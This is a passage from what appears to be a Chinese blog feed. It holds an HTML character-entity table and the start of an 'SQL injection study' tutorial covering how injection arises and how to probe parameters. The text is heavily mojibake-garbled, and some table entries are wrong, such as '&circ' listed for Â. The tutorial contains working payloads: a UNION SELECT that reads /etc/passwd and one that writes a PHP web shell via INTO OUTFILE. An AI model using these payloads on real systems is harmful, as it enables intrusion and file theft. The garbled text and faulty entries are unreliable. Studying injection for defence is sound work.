        <content type="html"><![CDATA[<h1 id="HTMLè½¬ä¹‰å­—ç¬¦"><a href="#HTMLè½¬ä¹‰å­—ç¬¦" class="headerlink" title="HTMLè½¬ä¹‰å­—ç¬¦"></a>HTMLè½¬ä¹‰å­—ç¬¦</h1><h2 id="å¸¸ç”¨å¯¹ç…§è¡¨"><a href="#å¸¸ç”¨å¯¹ç…§è¡¨" class="headerlink" title="å¸¸ç”¨å¯¹ç…§è¡¨"></a>å¸¸ç”¨å¯¹ç…§è¡¨</h2><table><thead><tr><th>å­—ç¬¦</th><th>åè¿›åˆ¶</th><th>è½¬ä¹‰å­—ç¬¦</th></tr></thead><tbody><tr><td>â€œ</td><td><code>&amp;#34</code></td><td><code>&amp;quot</code></td></tr><tr><td>&amp;</td><td><code>&amp;#38 </code></td><td><code>&amp;amp</code></td></tr><tr><td>&lt;</td><td><code>&amp;#60</code></td><td><code>&amp;lt</code></td></tr><tr><td>&gt;</td><td><code>&amp;#62</code></td><td><code>&amp;gt </code></td></tr><tr><td>ä¸æ–­å¼€ç©ºæ ¼(non-breaking space)</td><td><code>&amp;#160</code></td><td><code>&amp;nbsp </code></td></tr></tbody></table><h2 id="HTMLç‰¹æ®Šè½¬ä¹‰å­—ç¬¦å¯¹ç…§è¡¨"><a href="#HTMLç‰¹æ®Šè½¬ä¹‰å­—ç¬¦å¯¹ç…§è¡¨" class="headerlink" title="HTMLç‰¹æ®Šè½¬ä¹‰å­—ç¬¦å¯¹ç…§è¡¨"></a>HTMLç‰¹æ®Šè½¬ä¹‰å­—ç¬¦å¯¹ç…§è¡¨</h2><table><thead><tr><th align="left">å­—ç¬¦</th><th align="left">åè¿›åˆ¶</th><th align="left">è½¬ä¹‰å­—ç¬¦</th><th align="left">å­—ç¬¦</th><th align="left">åè¿›åˆ¶</th><th align="left">è½¬ä¹‰å­—ç¬¦</th><th align="left">å­—ç¬¦</th><th align="left">åè¿›åˆ¶</th><th align="left">è½¬ä¹‰å­—ç¬¦</th></tr></thead><tbody><tr><td align="left">?</td><td align="left"><code>&amp;#161</code></td><td align="left"><code>&amp;iexcl </code></td><td align="left">Ã</td><td align="left"><code>&amp;#193</code></td><td align="left"><code>&amp;Aacute </code></td><td align="left">Ã¡</td><td align="left"><code>&amp;#225 </code></td><td align="left"><code>&amp;aacute </code></td></tr><tr><td align="left">ï¿ </td><td align="left"><code>&amp;#162</code></td><td align="left"><code>&amp;cent </code></td><td align="left">Ã‚</td><td align="left"><code>&amp;#194 </code></td><td align="left"><code>&amp;circ </code></td><td align="left">Ã¢</td><td align="left"><code>&amp;#226</code></td><td align="left"><code>&amp;acirc </code></td></tr><tr><td align="left">ï¿¡</td><td align="left"><code>&amp;#163 </code></td><td align="left"><code>&amp;pound </code></td><td align="left">Ãƒ</td><td align="left"><code>&amp;#195 </code></td><td align="left"><code>&amp;Atilde </code></td><td align="left">Ã£</td><td align="left"><code>&amp;#227 </code></td><td align="left"><code>&amp;atilde </code></td></tr><tr><td align="left">Â¤</td><td align="left"><code>&amp;#164 </code></td><td align="left"><code>&amp;curren</code></td><td align="left">Ã„</td><td align="left"><code>&amp;#196</code></td><td align="left"><code>&amp;Auml</code></td><td align="left">Ã¤</td><td align="left"><code>&amp;#228</code></td><td align="left"><code>&amp;auml </code></td></tr><tr><td align="left">ï¿¥</td><td align="left"><code>&amp;#165 </code></td><td align="left"><code>&amp;yen </code></td><td align="left">Ã…</td><td align="left"><code>&amp;#197 </code></td><td align="left"><code>&amp;ring </code></td><td align="left">Ã¥</td><td align="left"><code>&amp;#229</code></td><td align="left"><code>&amp;aring </code></td></tr><tr><td align="left">|</td><td align="left"><code>&amp;#166</code></td><td align="left"><code>&amp;brvbar </code></td><td align="left">Ã†</td><td align="left"><code>&amp;#198 </code></td><td align="left"><code>&amp;AElig </code></td><td align="left">Ã¦</td><td align="left"><code>&amp;#230 </code></td><td align="left"><code>&amp;aelig </code></td></tr><tr><td align="left">Â§</td><td align="left"><code>&amp;#167</code></td><td align="left"><code>&amp;sect </code></td><td align="left">Ã‡</td><td align="left"><code>&amp;#199 </code></td><td align="left"><code>&amp;Ccedil </code></td><td align="left">Ã§</td><td align="left"><code>&amp;#231</code></td><td align="left"><code>&amp;ccedil </code></td></tr><tr><td align="left">Â¨</td><td align="left"><code>&amp;#168 </code></td><td align="left"><code>&amp;uml </code></td><td align="left">Ãˆ</td><td align="left"><code>&amp;#200 </code></td><td align="left"><code>&amp;Egrave </code></td><td align="left">Ã¨</td><td align="left"><code>&amp;#232 </code></td><td align="left"><code>&amp;egrave</code></td></tr><tr><td align="left">Â©</td><td align="left"><code>&amp;#169</code></td><td align="left"><code>&amp;copy </code></td><td align="left">Ã‰</td><td align="left"><code>&amp;#201 </code></td><td align="left"><code>&amp;Eacute </code></td><td align="left">Ã©</td><td align="left"><code>&amp;#233 </code></td><td align="left"><code>&amp;eacute </code></td></tr><tr><td align="left">a</td><td align="left"><code>&amp;#170 </code></td><td align="left"><code>&amp;ordf </code></td><td align="left">ÃŠ</td><td align="left"><code>&amp;#202 </code></td><td align="left"><code>&amp;Ecirc </code></td><td align="left">Ãª</td><td align="left"><code>&amp;#234 </code></td><td align="left"><code>&amp;ecirc </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#171</code></td><td align="left"><code>&amp;laquo </code></td><td align="left">Ã‹</td><td align="left"><code>&amp;#203 </code></td><td align="left"><code>&amp;Euml </code></td><td align="left">Ã«</td><td align="left"><code>&amp;#235 </code></td><td align="left"><code>&amp;euml </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#172 </code></td><td align="left"><code>&amp;not </code></td><td align="left">ÃŒ</td><td align="left"><code>&amp;#204 </code></td><td align="left"><code>&amp;Igrave </code></td><td align="left">Ã¬</td><td align="left"><code>&amp;#236 </code></td><td align="left"><code>&amp;igrave </code></td></tr><tr><td align="left">/x7f</td><td align="left"><code>&amp;#173 </code></td><td align="left"><code>&amp;shy </code></td><td align="left">Ã</td><td align="left"><code>&amp;#205 </code></td><td align="left"><code>&amp;Iacute </code></td><td align="left">Ã­</td><td align="left"><code>&amp;#237 </code></td><td align="left"><code>&amp;iacute </code></td></tr><tr><td align="left">Â®</td><td align="left"><code>&amp;#174 </code></td><td align="left"><code>&amp;reg </code></td><td align="left">Ã</td><td align="left"><code>&amp;#206 </code></td><td align="left"><code>&amp;Icirc </code></td><td align="left">Ã®</td><td align="left"><code>&amp;#238 </code></td><td align="left"><code>&amp;icirc </code></td></tr><tr><td align="left">Ë‰</td><td align="left"><code>&amp;#175 </code></td><td align="left"><code>&amp;macr </code></td><td align="left">Ã</td><td align="left"><code>&amp;#207 </code></td><td align="left"><code>&amp;Iuml </code></td><td align="left">Ã¯</td><td align="left"><code>&amp;#239 </code></td><td align="left"><code>&amp;iuml </code></td></tr><tr><td align="left">Â°</td><td align="left"><code>&amp;#176 </code></td><td align="left"><code>&amp;deg </code></td><td align="left">Ã</td><td align="left"><code>&amp;#208 </code></td><td align="left"><code>&amp;ETH </code></td><td align="left">Ã°</td><td align="left"><code>&amp;#240 </code></td><td align="left"><code>&amp;ieth </code></td></tr><tr><td align="left">Â±</td><td align="left"><code>&amp;#177 </code></td><td align="left"><code>&amp;plusmn </code></td><td align="left">Ã‘</td><td align="left"><code>&amp;#209</code></td><td align="left"><code>&amp;Ntilde </code></td><td align="left">Ã±</td><td align="left"><code>&amp;#241 </code></td><td align="left"><code>&amp;ntilde </code></td></tr><tr><td align="left">2</td><td align="left"><code>&amp;#178 </code></td><td align="left"><code>&amp;sup2 </code></td><td align="left">Ã’</td><td align="left"><code>&amp;#210</code></td><td align="left"><code>&amp;Ograve </code></td><td align="left">Ã²</td><td align="left"><code>&amp;#242 </code></td><td align="left"><code>&amp;ograve </code></td></tr><tr><td align="left">3</td><td align="left"><code>&amp;#179 </code></td><td align="left"><code>&amp;sup3 </code></td><td align="left">Ã“</td><td align="left"><code>&amp;#211</code></td><td align="left"><code>&amp;Oacute </code></td><td align="left">Ã³</td><td align="left"><code>&amp;#243 </code></td><td align="left"><code>&amp;oacute</code></td></tr><tr><td align="left">â€²</td><td align="left"><code>&amp;#180 </code></td><td align="left"><code>&amp;acute </code></td><td align="left">Ã”</td><td align="left"><code>&amp;#212</code></td><td align="left"><code>&amp;Ocirc </code></td><td align="left">Ã´</td><td align="left"><code>&amp;#244 </code></td><td align="left"><code>&amp;ocirc </code></td></tr><tr><td align="left">Î¼</td><td align="left"><code>&amp;#181 </code></td><td align="left"><code>&amp;micro </code></td><td align="left">Ã•</td><td align="left"><code>&amp;#213</code></td><td align="left"><code>&amp;Otilde </code></td><td align="left">Ãµ</td><td align="left"><code>&amp;#245 </code></td><td align="left"><code>&amp;otilde </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#182 </code></td><td align="left"><code>&amp;para </code></td><td align="left">Ã–</td><td align="left"><code>&amp;#214</code></td><td align="left"><code>&amp;Ouml </code></td><td align="left">Ã¶</td><td align="left"><code>&amp;#246 </code></td><td align="left"><code>&amp;ouml </code></td></tr><tr><td align="left">Â·</td><td align="left"><code>&amp;#183 </code></td><td align="left"><code>&amp;middot</code></td><td align="left">&amp;times</td><td align="left"><code>&amp;#215</code></td><td align="left"><code>&amp;times </code></td><td align="left">Ã·</td><td align="left"><code>&amp;#247 </code></td><td align="left"><code>&amp;divide </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#184 </code></td><td align="left"><code>&amp;cedil </code></td><td align="left">Ã˜</td><td align="left"><code>&amp;#216</code></td><td align="left"><code>&amp;Oslash </code></td><td align="left">Ã¸</td><td align="left"><code>&amp;#248 </code></td><td align="left"><code>&amp;oslash </code></td></tr><tr><td align="left">1</td><td align="left"><code>&amp;#185 </code></td><td align="left"><code>&amp;sup1 </code></td><td align="left">Ã™</td><td align="left"><code>&amp;#217</code></td><td align="left"><code>&amp;Ugrave </code></td><td align="left">Ã¹</td><td align="left"><code>&amp;#249 </code></td><td align="left"><code>&amp;ugrave </code></td></tr><tr><td align="left">o</td><td align="left"><code>&amp;#186 </code></td><td align="left"><code>&amp;ordm </code></td><td align="left">Ãš</td><td align="left"><code>&amp;#218</code></td><td align="left"><code>&amp;Uacute</code></td><td align="left">Ãº</td><td align="left"><code>&amp;#250 </code></td><td align="left"><code>&amp;uacute </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#187 </code></td><td align="left"><code>&amp;raquo </code></td><td align="left">Ã›</td><td align="left"><code>&amp;#219</code></td><td align="left"><code>&amp;Ucirc </code></td><td align="left">Ã»</td><td align="left"><code>&amp;#251 </code></td><td align="left"><code>&amp;ucirc </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#188 </code></td><td align="left"><code>&amp;frac14 </code></td><td align="left">Ãœ</td><td align="left"><code>&amp;#220</code></td><td align="left"><code>&amp;Uuml </code></td><td align="left">Ã¼</td><td align="left"><code>&amp;#252 </code></td><td align="left"><code>&amp;uuml </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#189 </code></td><td align="left"><code>&amp;frac12 </code></td><td align="left">Ã</td><td align="left"><code>&amp;#221</code></td><td align="left"><code>&amp;Yacute </code></td><td align="left">Ã½</td><td align="left"><code>&amp;#253 </code></td><td align="left"><code>&amp;yacute </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#190 </code></td><td align="left"><code>&amp;frac34 </code></td><td align="left">Ã</td><td align="left"><code>&amp;#222</code></td><td align="left"><code>&amp;THORN </code></td><td align="left">Ã¾</td><td align="left"><code>&amp;#254 </code></td><td align="left"><code>&amp;thorn </code></td></tr><tr><td align="left">?</td><td align="left"><code>&amp;#191 </code></td><td align="left"><code>&amp;iquest </code></td><td align="left">ÃŸ</td><td align="left"><code>&amp;#223</code></td><td align="left"><code>&amp;szlig </code></td><td align="left">Ã¿</td><td align="left"><code>&amp;#255 </code></td><td align="left"><code>&amp;yuml </code></td></tr><tr><td align="left">Ã€</td><td align="left"><code>&amp;#192</code></td><td align="left"><code>&amp;Agrave </code></td><td align="left">Ã </td><td align="left"><code>&amp;#224</code></td><td align="left"><code>&amp;agrave </code></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥å­¦ä¹ </title>
      <link href="/2021/07/19/sql/"/>
      <url>/2021/07/19/sql/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥å­¦ä¹ "><a href="#SQLæ³¨å…¥å­¦ä¹ " class="headerlink" title="SQLæ³¨å…¥å­¦ä¹ "></a>SQLæ³¨å…¥å­¦ä¹ </h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="æ•°æ®åº“ä¸webäº¤äº’"><a href="#æ•°æ®åº“ä¸webäº¤äº’" class="headerlink" title="æ•°æ®åº“ä¸webäº¤äº’"></a>æ•°æ®åº“ä¸webäº¤äº’</h3><p>æ•°æ®åº“é©±åŠ¨çš„Webåº”ç”¨é€šå¸¸åŒ…å«ä¸‰å±‚ï¼šè¡¨ç¤ºå±‚ã€é€»è¾‘å±‚å’Œå­˜å‚¨å±‚</p><p><img src="https://z3.ax1x.com/2021/04/21/cbHpa4.png" alt="cbHpa4.png"></p><p>Webæµè§ˆå™¨ï¼ˆè¡¨ç¤ºå±‚ï¼‰å‘ä¸­é—´å±‚ï¼ˆé€»è¾‘å±‚ï¼‰å‘é€è¯·æ±‚ï¼Œåè€…ä¾æ¬¡è°ƒç”¨ç”±ä½äºåº”ç”¨å±‚ çš„åº”ç”¨æœåŠ¡å™¨æä¾›çš„APIï¼Œåº”ç”¨å±‚é€šè¿‡æŸ¥è¯¢ã€æ›´æ–°æ•°æ®åº“ï¼ˆå­˜å‚¨å±‚ï¼‰æ¥å“åº”è¯¥è¯·æ±‚ã€‚</p><p><img src="https://z3.ax1x.com/2021/07/19/WJgYwQ.png" alt="WJgYwQ.png"></p><h3 id="SQLæ³¨å…¥çš„äº§ç”Ÿè¿‡ç¨‹"><a href="#SQLæ³¨å…¥çš„äº§ç”Ÿè¿‡ç¨‹" class="headerlink" title="SQLæ³¨å…¥çš„äº§ç”Ÿè¿‡ç¨‹"></a><strong>SQL</strong>æ³¨å…¥çš„äº§ç”Ÿè¿‡ç¨‹</h3><h4 id="æ„é€ åŠ¨æ€å­—ç¬¦ä¸²"><a href="#æ„é€ åŠ¨æ€å­—ç¬¦ä¸²" class="headerlink" title="æ„é€ åŠ¨æ€å­—ç¬¦ä¸²"></a>æ„é€ åŠ¨æ€å­—ç¬¦ä¸²</h4><p>ç®€å•æ¥è¯´å°±æ˜¯å°†å¾—åˆ°å‚æ•°æ‹¼æ¥åˆ°æŸ¥è¯¢è¯­å¥ï¼Œç„¶åæ‰§è¡Œï¼Œä¸‹åˆ—ä¸å½“å°†ä¼šå¯¼è‡´SQLæ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">TABLE</span> <span class="token keyword">WHERE</span> FIELD <span class="token operator">=</span> <span class="token string">'input'</span>input åœ¨ä¸åŒè¯­è¨€è¿è¡Œçš„æœåŠ¡å™¨ä¸Šå†™æ³•ä¸åŒPHP$query <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field ='$_GET["</span>input<span class="token string">"]'"</span><span class="token punctuation">.</span>NETquery <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = ' "</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>getParameter<span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ' "</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>è½¬ä¹‰å­—ç¬¦å¤„ç†ä¸å½“</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">SQL</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM table WHERE field = '$_GET["</span>input<span class="token string">"]'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SQLæ•°æ®åº“å°†å•å¼•å·å­—ç¬¦<code>'</code>è§£ææˆä»£ç ä¸æ•°æ®é—´çš„åˆ†ç•Œçº¿ï¼Œå•å¼•å·å¤–é¢çš„å†…å®¹å‡æ˜¯éœ€è¦è¿è¡Œçš„ä»£ç ï¼Œè€Œç”¨å•å¼•å·å¼•èµ·æ¥çš„å†…å®¹å‡æ˜¯æ•°æ®ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> field <span class="token operator">=</span> <span class="token string">''</span>æŠ¥é”™You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>' at line <span class="token number">1</span>è¿™æ˜¯ä¸€ç§æŠ¥é”™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å‡ºç°è¯¥é”™è¯¯æ˜¯å› ä¸ºå•å¼•å·å­—ç¬¦è¢«è§£ææˆäº†å­—ç¬¦ä¸²åˆ†éš”ç¬¦ã€‚è¿è¡Œæ—¶æ‰§è¡Œçš„SQLæŸ¥è¯¢åœ¨è¯­æ³•ä¸Šå­˜åœ¨é”™è¯¯(å®ƒåŒ…å«å¤šä¸ªå­—ç¬¦ä¸²åˆ†éš”ç¬¦)ï¼Œæ‰€ä»¥æ•°æ®åº“æŠ›å‡ºå¼‚å¸¸ã€‚SQLæ•°æ®åº“å°†å•å¼•å·å­—ç¬¦çœ‹ä½œç‰¹æ®Šå­—ç¬¦(å­—ç¬¦ä¸²åˆ†éš”ç¬¦)ã€‚</p><p>å½“ç„¶è¿˜æœ‰å…¶ä»–çš„è½¬ä¹‰å­—ç¬¦ï¼Œæ¯”å¦‚oracleä¸­ï¼Œç©ºæ ¼<code> </code> åŒæ–œçº¿<code>|| </code>é€—å·<code>,</code> ç‚¹å·<code>.</code> <code>*/</code>ä»¥åŠåŒå¼•å·<code>"</code> è¿™é‡Œä¸è¯¦ç»†è®²è§£ã€‚</p><p><code>||</code>å°†å‰åçš„æ‰§è¡Œç»“æœè¿æ¥</p><p><code>*/</code> ç»“æŸæ³¨é‡Š</p></li><li><p>ç±»å‹å¤„ç†ä¸å½“</p><p>æ¥å—çš„å‚æ•°ç±»å‹ä¸ä¸€å®šæ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯èƒ½æ˜¯æ•°å­—å‹ï¼Œè¿™é‡Œä¸€å‘³åœ°è¿‡æ»¤å•å¼•å·ä¹Ÿå°±æ²¡å¤šå¤§ç”¨å¤„ã€‚</p><p>æ•°å­—å‹<code>or 1=1</code>å¤§æ¦‚åˆ¤æ–­ï¼Œä¸€æ—¦å­˜åœ¨å¹¶æœ‰FILEæƒé™ï¼Œå°±èƒ½ä½¿ç”¨ä¸‹é¢ä»£ç æ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token comment">--</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token string">"&lt;? system($_REQUEST['cmd']); ?&gt;"</span><span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/victim.com/cmd.php"</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>æŸ¥è¯¢è¯­å¥ç»„è£…ä¸å½“</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$SQL</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"columnl"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">","</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"column2"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">","</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"column3"</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">"FROM"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"table"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ç§éšä¾¿æ”¹ä¸ªåŒ…å‘é€ï¼Œæ•°æ®åº“åŸºæœ¬ä¸Šå°±æ²¡äº†ï¼Œå› ä¸ºæ‰€æœ‰å‚æ•°å¯æ”¹</p></li><li><p>é”™è¯¯å¤„ç†ä¸å½“</p><p>å°±å¦‚ç¬¬ä¸€ä¸ªæŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯å®Œå…¨ä¸å¿…å±•ç¤ºç»™ç”¨æˆ·çœ‹ï¼Œä¸å±•ç¤ºï¼Œè‡ªç„¶ä¼šé˜»æ–­éƒ¨åˆ†æ”»å‡»è€…ã€‚</p></li><li><p>å¤šä¸ªæäº¤å¤„ç†ä¸å½“</p><p>è¿™é‡Œæœ‰ç‚¹æ¡ä»¶ç«äº‰çš„æ„æ€</p><p>ç¬¬ä¸€ä¸ªæäº¤éœ€è¦éªŒè¯ç ï¼Œç¬¬äºŒä¸ªå´æ²¡è®¾ç½®ï¼Œæ­£å¸¸ç”¨æˆ·å¯èƒ½ä¼šä»ç¬¬ä¸€ä¸ªæäº¤è¿›å…¥ï¼Œæ”»å‡»è€…å°±ä¼šç”¨ç¬¬äºŒä¸ªæäº¤FUZZï¼Œè¿™å°±å’ŒæŸäº›åº”ç”¨åˆ†äº«ä¸€æ ·ï¼Œä¸éªŒè¯æ˜¯å¦æˆåŠŸï¼Œè™šæ™ƒä¸€æ‹›ã€‚</p></li></ul><h4 id="ä¸å®‰å…¨çš„æ•°æ®åº“é…ç½®"><a href="#ä¸å®‰å…¨çš„æ•°æ®åº“é…ç½®" class="headerlink" title="ä¸å®‰å…¨çš„æ•°æ®åº“é…ç½®"></a>ä¸å®‰å…¨çš„æ•°æ®åº“é…ç½®</h4><p>é»˜è®¤çš„æ•°æ®åº“ç³»ç»Ÿç®¡ç†å‘˜è´¦å·ï¼Œé¢„ç½®çš„ç³»ç»Ÿåº“ï¼Œè¡¨ï¼Œå¾ˆå¤šçš„é»˜è®¤é…ç½®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼ŒçŸ¥é“ä½ çš„ç®¡ç†å‘˜è´¦å·ï¼Œçˆ†ç ´å¯†ç ä¼šé™ä½å¤šå°‘æ•°é‡çº§çš„éš¾åº¦</p><p>é™ä½æƒé™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Oracleè¯­å¥ï¼Œåˆ—ä¸¾å½“å‰ç”¨æˆ·å¯è®¿é—®çš„æ‰€æœ‰è¡¨</span><span class="token keyword">SELECT</span> OWNER<span class="token punctuation">,</span> TABLE_NAME <span class="token keyword">FROM</span> ALL_TABLES <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> TABLE_NAME<span class="token punctuation">;</span> <span class="token comment">--MySQLè¯­å¥ï¼Œåˆ—ä¸¾å½“å‰ç”¨æˆ·å¯è®¿é—®çš„æ‰€æœ‰è¡¨å’Œæ•°æ®åº“</span><span class="token keyword">SELECT</span> table_schema<span class="token punctuation">,</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">--MSSQLè¯­å¥ï¼Œä½¿ç”¨ç³»ç»Ÿè¡¨åˆ—ä¸¾æ‰€æœ‰å¯è®¿é—®çš„è¡¨</span><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sysobjects <span class="token keyword">WHERE</span> xtype <span class="token operator">=</span> <span class="token string">'U'</span><span class="token punctuation">;</span><span class="token comment">--MSSQLè¯­å¥ï¼Œä½¿ç”¨ç›®å½•è§†å›¾åˆ—ä¸¾æ‰€æœ‰å¯è®¿é—®çš„è¡¨</span><span class="token keyword">SELECT</span> name <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SQLæ³¨å…¥æµ‹è¯•"><a href="#SQLæ³¨å…¥æµ‹è¯•" class="headerlink" title="SQLæ³¨å…¥æµ‹è¯•"></a>SQLæ³¨å…¥æµ‹è¯•</h2><h3 id="å¯»æ‰¾æ³¨å…¥ç‚¹"><a href="#å¯»æ‰¾æ³¨å…¥ç‚¹" class="headerlink" title="å¯»æ‰¾æ³¨å…¥ç‚¹"></a>å¯»æ‰¾æ³¨å…¥ç‚¹</h3><h4 id="å€ŸåŠ©æ¨ç†è¿›è¡Œæµ‹è¯•"><a href="#å€ŸåŠ©æ¨ç†è¿›è¡Œæµ‹è¯•" class="headerlink" title="å€ŸåŠ©æ¨ç†è¿›è¡Œæµ‹è¯•"></a>å€ŸåŠ©æ¨ç†è¿›è¡Œæµ‹è¯•</h4><h5 id="è¯†åˆ«æ•°æ®è¾“å…¥"><a href="#è¯†åˆ«æ•°æ®è¾“å…¥" class="headerlink" title="è¯†åˆ«æ•°æ®è¾“å…¥"></a>è¯†åˆ«æ•°æ®è¾“å…¥</h5><p>GETè¯·æ±‚ã€POSTè¯·æ±‚ã€HTTPå…¶ä»–ä¸æ•°æ®åº“æœ‰äº¤äº’çš„éƒ½å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œæ¯”å¦‚COOKIEæ³¨å…¥ã€‚</p><h5 id="æ“çºµå‚æ•°"><a href="#æ“çºµå‚æ•°" class="headerlink" title="æ“çºµå‚æ•°"></a>æ“çºµå‚æ•°</h5><p><code>http://sql.com/index.php?id=1</code></p><p>è¿™ä¸ª<code>1</code>å°±æ˜¯å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•ï¼Œæ¯”å¦‚<code>'</code></p><p>å…ˆå°†<code>id</code>æ”¹ä¸ºä¸€ä¸ªä¸å¸¸è§çš„å‚æ•°ï¼ŒæŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: mysql_fetch_assoc <span class="token punctuation">(</span><span class="token punctuation">)</span> : supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid MySQL result resource <span class="token operator">in</span> XXXX <span class="token keyword">on</span> line <span class="token number">34</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŠ ä¸€ä¸ªå•å¼•å·<code>http://sql.com/index.php?id=1'</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„æµ‹è¯•æ–¹æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">åœ¨Oracleå’ŒPostgreSQLä¸­çš„æ¼æ´ã€‚å‘WebæœåŠ¡å™¨å‘é€ä¸‹é¢ä¸¤ä¸ªè¯·æ±‚ï¼šhttp:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'||'kes</span>åœ¨Microsoft <span class="token keyword">SQL</span> Serverä¸­ä¸ä¹‹ç­‰ä»·çš„è¯·æ±‚ä¸ºï¼šhttp:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>http:<span class="token comment">//www.victim.com/showproducts.php?category=bi'+'kes</span>åœ¨MySQLä¸­ä¸ä¹‹ç­‰ä»·çš„è¯·æ±‚ä¸ºï¼ˆè¯·æ³¨æ„ä¸¤ä¸ªå•å¼•å·ä¹‹é—´çš„ç©ºæ ¼ï¼‰ï¼šhttp:<span class="token comment">//www.victim.com/showproducts.php?category=bikes</span>http:<span class="token comment">//www.victim.com/showproducts.php?category=bi''kes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ä¿¡æ¯å·¥ä½œæµ"><a href="#ä¿¡æ¯å·¥ä½œæµ" 